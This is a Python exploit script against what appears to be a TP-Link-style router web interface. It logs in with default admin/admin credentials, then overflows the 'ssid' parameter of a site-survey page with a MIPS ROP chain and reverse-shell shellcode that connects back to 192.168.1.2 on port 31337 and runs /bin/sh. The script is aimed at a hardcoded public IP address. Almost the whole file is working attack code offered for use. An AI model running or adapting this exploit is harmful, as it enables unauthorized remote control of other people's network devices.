#coding=utf-8
import requests
import urllib
import os,sys
from pwn import *
context.arch="mips"
context.endian="big"
proxies = {
 "http":"http://10.211.55.2:33333",
 "https":"https://10.211.55.2:33333"
}

session=requests.Session()
session.verify=False

libc_addr = 0x2aecc000#0x77f4b000
bin_sh_addr = libc_addr+0x00059D28
escape_code = "\x35\x6b\xff\x3c" # ori $t3,$t3,0xff3c

session=requests.Session()
session.verify=False




def login(ip,user,pwd):
    hash=hashlib.md5()
    hash.update(pwd)
    auth_string="%s:%s" %(user,hash.hexdigest())
    encoded_string = base64.b64encode(auth_string)
    encoded_string=urllib.quote(" "+encoded_string)
    print(encoded_string)
    headers={"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Referer": "http://{ip}/".format(ip=ip),
            "Cookie": "Authorization=Basic%s"%encoded_string,
            "Upgrade-Insecure-Requests": "1"}
    params={"Save":"Save"}
    url = "http://" + ip + "/userRpm/LoginRpm.htm"
    resp=session.get(url,params=params,headers=headers,timeout=10)
    print resp.text
    path="%s"%((resp.text).split("=")[2].split("/")[3])
    cookie="%s"%encoded_string
    return path,cookie
def get_shellcode():
    # 编码字符：\x0d、\x0a、\x3c
    stg3_SC =   "\x24\x0f\xff\xfd"
    stg3_SC +=   "\x01\xe0\x20\x27"
    stg3_SC +=   "\x01\xe0\x28\x27"
    stg3_SC +=  "\x28\x06\xff\xff"
    stg3_SC +=  "\x24\x02\x10\x57"
    stg3_SC +=  "\x01\x01\x01\x0c"  # syscall 0x40404
    stg3_SC +=   "\xaf\xa2\xff\xff"
    stg3_SC +=   "\x8f\xa4\xff\xff"
    stg3_SC +=   "\x24\x0f\xff\xfd"
    stg3_SC +=   "\x01\xe0\x78\x27"
    stg3_SC +=   "\xaf\xaf\xff\xe0"
    stg3_SC +=   escape_code
    stg3_SC +=   "\x0e\x7a\x69"
    stg3_SC +=  "\x35\xce\x7a\x69" # \x7a\x69：监听端口 31337
    stg3_SC +=  "\xaf\xae\xff\xe4" # sw      t6,-28(sp)
    stg3_SC +=   escape_code
          # 本地 IP 地址：192.168.1.2
    stg3_SC +=   "\x0f\x2f\x5d"  # \xc0\xa8：192.168
    stg3_SC +=   "\x35\xef\xd5\x6d" # \x01\x02：1.2
    stg3_SC +=   "\xaf\xaf\xff\xe6"  # sw      t7,-26(sp)
    stg3_SC +=   "\x23\xa5\xff\xe2"
    stg3_SC +=   "\x24\x0c\xff\xef"
    stg3_SC +=   "\x01\x80\x30\x27"
    stg3_SC +=   "\x24\x02\x10\x4a"
    stg3_SC +=   "\x01\x01\x01\x0c" # syscall 0x40404
    stg3_SC +=   "\x24\x0f\xff\xfd" # dup2 loop
    stg3_SC +=   "\x01\xe0\x28\x27"
    stg3_SC +=   "\x8f\xa4\xff\xff"
    stg3_SC +=   "\x24\x02\x0f\xdf"
    stg3_SC +=   "\x01\x01\x01\x0c"
    stg3_SC +=   "\x20\xa5\xff\xff"
    stg3_SC +=   "\x24\x01\xff\xff"
    stg3_SC +=   "\x14\xa1\xff\xfb"
    stg3_SC +=   "\x28\x06\xff\xff" # slti    a2,zero,-1
    stg3_SC +=   escape_code
          # "/bin/sh" 字符串在 libc 中的地址
    stg3_SC +=   "\x04\x77\xf9"  # lui a0,0x77f9
    stg3_SC +=   "\x34\x84\x2d\x28" # ori a0,a0,0x2d28
    stg3_SC +=   "\x28\x05\xff\xff"
    stg3_SC +=   "\x24\x02\x0f\xab"
    stg3_SC +=   "\x01\x01\x01\x0c" # syscall 0x40404
    stg3_SC +=   "\x24\x02\x0f\xa1" # exit(0)
    stg3_SC +=   "\x01\xc0\x20\x27"
    stg3_SC +=   "\x01\x01\x01\x0c"
    print("payload size: " + str(len(stg3_SC)))
    return stg3_SC


def get_payload():
    fill_payload = "/%0A" * 0x55 + 'a' * 2
    # ---------- ROP1 ------------
    fill_payload += 'B' * 4  # s0
    fill_payload += p32(libc_addr + 0x00036068)  # s1
    fill_payload += p32(libc_addr + 0x00053CA0)  # s2
    payload = fill_payload
    payload += p32(libc_addr + 0x000E204)  # ra
    # ---------- ROP2 ------------
    payload += 'a' * 0x18
    payload += 'e' * 4  # s0
    payload += p32(libc_addr + 0x00391AC)  # s1
    payload += 'c' * 4  # s2
    payload += p32(libc_addr + 0x000E904)  # ra
    payload += 'a' * 0x18
    payload += get_shellcode()
    return urllib.unquote(payload)  # unquote %0a
def getshell(cookie,path,ip):
    url = "http://{ip}/{path}/userRpm/popupSiteSurveyRpm_AP.htm".format(ip=ip,path=path)
    headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Cookie":"Authorization=Basic{cookie}".format(cookie=cookie),
    }
    params = {
    "mode":"1000",
    "curRegion":"1000",
    "chanWidth":"100",
    "channel":"1000",
    "ssid":get_payload()
    }
    res = requests.get(url,params=params,headers=headers,timeout=30)#,proxies=proxies)
    print(res.text)

ip="202.79.43.209"
path,cookie=login(ip,"admin","admin")
# cookie="%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D"
# path="UWILOTSAODXCRKSC"
print(cookie,path,ip)

getshell(cookie,path,ip)

